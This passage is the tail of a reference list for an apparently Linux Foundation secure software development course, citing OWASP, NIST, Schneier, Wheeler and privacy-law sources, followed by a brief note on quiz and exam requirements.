Open Web Application Security Project (OWASP), *Unvalidated Redirects and Forwards Cheat Sheet* ([https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html))

Open Web Application Security Project (OWASP), *Vulnerability Disclosure Cheat Sheet* ([https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html))

Qualys, *SSL Server Test* ([https://www.ssllabs.com/ssltest/](https://www.ssllabs.com/ssltest/))

Patchstack, 2022, State Of WordPress Security In 2021 ([https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/]( https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/))

Petro, Dan and Allan Cecil, 2021, You're Doing IoT RNG, DEF CON 29 ([https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng)) with presentation at [https://www.youtube.com/watch?v=Zuqw0-jZh9Y](https://www.youtube.com/watch?v=Zuqw0-jZh9Y)

Phil, 2016-04-19, "Detecting the use of "curl | bash" server side", idontplaydarts.com, <https://web.archive.org/web/20230325190353/https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/> <!-- https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/ -->

Ponemon Institute LLC, *Costs and Consequences of Gaps in Vulnerability Responses*, 2019 ([https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html](https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html))

PostgreSQL, *PostgreSQL 14*, "Command Execution Functions",
(<https://www.postgresql.org/docs/current/libpq-exec.html>).


Rebert, Alexandre; Cha, Sang Kil; Avgerinos, Thanassis; Foote, Jonathan; Warren David; Grieco, Gustavo; Brumley, David, *Optimizing Seed Selection for Fuzzing*, 2014 ([https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf))

Red Hat, *What Is DevSecOps?* ([https://www.redhat.com/en/topics/devops/what-is-devsecops](https://www.redhat.com/en/topics/devops/what-is-devsecops))

Red Hat, *What Is GitOps?* ([https://www.redhat.com/en/topics/devops/what-is-gitops])

Regehr, John, *A Guide to Undefined Behavior in C and C++ (Parts 1-3)*, 2010 ([http://blog.regehr.org/archives/213](http://blog.regehr.org/archives/213))

Reichel, Robert, *How we threat model*, 2020-09-02 ([https://github.blog/2020-09-02-how-we-threat-model/](https://github.blog/2020-09-02-how-we-threat-model/))

Reproducible Builds project, “Definitions”, (<https://reproducible-builds.org/docs/definition/>)

Ritchey, Diane, "Data Breach Directions: What to Do After an Attack", *Security Magazine*, 2015-02-01, <https://www.securitymagazine.com/articles/86071-data-breach-directions-what-to-do-after-an-attack>

Rogers, Tony, *Falsehoods Programmers Believe About Names - With Examples*, 2018 ([https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/](https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/))

Romailler, Yolan, *The definitive guide to “Modulo Bias and how to avoid it”!* (<https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/>)

Royce, Winston W., *Managing the Development of Large Systems: Concepts and Techniques*, 1970 ([https://dl.acm.org/doi/10.5555/41765.41801](https://dl.acm.org/doi/10.5555/41765.41801))

Rust Programming Language, *Recoverable Errors with Result* ([https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html](https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html))

SAFECode training materials ([https://safecode.org/training/](https://safecode.org/training/))

SAFECode, *Principles for Software Assurance Assessment*, 2019 ([https://safecode.org/principles-of-software-assurance-assessment/](https://safecode.org/principles-of-software-assurance-assessment/))

Saltzer, Jerome H., Schroeder, Michael D., *The Protection of Information in Computer Systems*, 1975 ([http://web.mit.edu/Saltzer/www/publications/protection/index.html](http://web.mit.edu/Saltzer/www/publications/protection/index.html))

Scanlon, Thomas, *10 Types of Application Security Testing Tools: When and How to Use Them*, Software Engineering Institute (SEI) Blog, 2018-07-09 ([https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html))

Schneier, Bruce, *Me on the Equifax Breach: Testimony and Statement for the Record of Bruce Schneier*, Hearing on “Securing Consumers’ Credit Data in the Age of Digital Commerce” before the Subcommittee on Digital Commerce and Consumer Protection, Committee on Energy and Commerce, United States House of Representatives, 2017-11-01 ([https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html))

Schneier, Bruce, *The Process of Security*, 2000 ([https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html](https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html))

Schneier, Bruce, *The Security Mindset*, 2008-03 ([https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html](https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html))

Schneier, Bruce, *Inside the Twisted Mind of the Security Professional*, Wired, 2008-03-20, [https://www.schneier.com/essays/archives/2008/03/inside_the_twisted_m.html](https://www.schneier.com/essays/archives/2008/03/inside_the_twisted_m.html)

Security Headers website for testing headers on publicly accessible sites ([https://securityheaders.com/](https://securityheaders.com/))

Security.txt ([https://securitytxt.org/](https://securitytxt.org/))

Sentinel Labs, “CVE-2021-45608 | NetUSB RCE Flaw in Millions of End User Routers” ([https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/](https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/))

Shahin, Mojtaba; Babar, Muhammad Ali; Zhu, Liming, *Continuous Integration, Delivery and Deployment: A Systematic Review on Approaches, Tools, Challenges and Practices*, IEEE Access, 2017 ([https://arxiv.org/abs/1703.07019](https://arxiv.org/abs/1703.07019))

Shevchenko, Nataliya, *Threat Modeling: 12 Available Methods*, 2018 ([https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html))

Shu, Xiaokui; Ciambrone, Andrew; Yao, Danfeng, *Breaking the Target: An Analysis of Target Data Breach and Lessons Learned*, 2017-01-18 ([https://arxiv.org/pdf/1701.04940.pdf](https://arxiv.org/pdf/1701.04940.pdf))

Sim, Darren, *Security Vulnerability and Browser Performance Impact of Target="_blank”*, 2019-03-23 ([https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547](https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547))

Singh, Animesh, Anupama Murthy, and Christian Kadner,
[Integrate adversarial attacks in a model training pipeline](https://developer.ibm.com/patterns/integrate-adversarial-attacks-model-training-pipeline/),
2018-06-25

SSD Disclosure, SSD Advisory – VestaCP LPE Vulnerabilities, 2021-03-20, (<https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/>)

State of California, *California Online Privacy Protection Act (OPPA)*, 2003 ([https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575))

State of California, *California Online Privacy Protection Act (OPPA), CHAPTER 22. Internet Privacy Requirements [22575-22579]*, 2003 ([https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575))

State of California, *California Consumer Privacy Act (CCPA)*, 2018 ([https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5](https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5))

Stilgherrian, *Relying on bug bounties ‘not appropriate risk management’: Katie Moussouris*, 2019 ([https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/](https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/))

Swift, *Optional Chaining* ([https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html](https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html))

Tabassi, Elham (NIST), Kevin Burns (MITRE), Michael Hadjimichael (MITRE), Andres Molina-Markham (MITRE), Julian Sexton (MITRE),
A Taxonomy and Terminology of Adversarial Machine Learning
NISTIR 8269 (Draft),
October 2019
<https://csrc.nist.gov/publications/detail/nistir/8269/draft>

The Fuzzing Project ([https://fuzzing-project.org/](https://fuzzing-project.org/))

The Linux Foundation, *Summary of GDPR Concepts For Free and Open Source Software Projects*, 2018 ([https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf))

The Linux Foundation, *Telemetry Data Collection and Usage Policy*, 2019 ([https://www.linuxfoundation.org/telemetry-data-policy/](https://www.linuxfoundation.org/telemetry-data-policy/))

The Open Group, PO*SIX standard - definition of the environ variable*, 2018 ([https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html](https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html))

Thomas, “Myths about /dev/urandom”, (<https://www.2uo.de/myths-about-urandom>)

Trail of Bits, *Seriously, stop using RSA*, 2019 ([https://blog.trailofbits.com/2019/07/08/fuck-rsa/](https://blog.trailofbits.com/2019/07/08/fuck-rsa/))

United Nations, *International Covenant on Civil and Political Rights, Article 17*, 1966 ([https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx](https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx))

US Department of Defense (DoD)’s Office of the Deputy Assistant Secretary of Defense for Systems Engineering (OASD SE), *Risk, Issue, and Opportunity Management Guide for Defense Acquisition Programs*, 2017-01 ([http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf](http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf))

US National Institute of Standards and Technology (NIST) Cybersecurity Framework ([https://www.nist.gov/cyberframework](https://www.nist.gov/cyberframework))

US National Institute of Standards and Technology (NIST), National Vulnerability Database (NVD) ([https://nvd.nist.gov/](https://nvd.nist.gov/))

*US Privacy Act of 1974 (5 U.S.C. 552a)* ([https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf](https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf))

VeraCode, *DAST TEST: Benefits of a DAST test for application security*, 2020 ([https://www.veracode.com/security/dast-test](https://www.veracode.com/security/dast-test))

WHATWG Fetch Specification ([https://fetch.spec.whatwg.org/#http-extensions](https://fetch.spec.whatwg.org/#http-extensions))

Wheeler, David A., *A Sample Security Assurance Case Pattern*, IDA Paper P-9278, 2018-12 ([https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx))

Wheeler, David A., *Core Infrastructure Initiative (CII) Best Practices Badge in 2019*, 2019-03-14 ([https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf](https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf))

Wheeler, David A., *How to Prevent the next Heartbled*, 2020-07-18 ([https://dwheeler.com/essays/heartbleed.html](https://dwheeler.com/essays/heartbleed.html))

Wheeler, David A., *The Apple goto fail vulnerability: lessons learned*, 2020-08-13 ([https://dwheeler.com/essays/apple-goto-fail.html](https://dwheeler.com/essays/apple-goto-fail.html))

Wheeler, David A., “Preventing Supply Chain Attacks like SolarWinds”, *Linux Foundation blog*, 2021-01-13, (<https://linuxfoundation.org/blog/preventing-supply-chain-attacks-like-solarwinds/>)

# Education Team Requirements

The LF education team needs:

1. overview for each chapter in each of the 3 courses along with learning objectives {This is already done above; see the text after each “Heading 1”)

2. end of chapter graded quizzes: 3-6 questions, preferably multiple choice style

3. final exam for each of the 3 courses: 15 questions, preferably multiple choice, different than the ones in the end of chapter quizzes.

Items 2 and 3 are covered in a separate file, to protect their confidentiality.

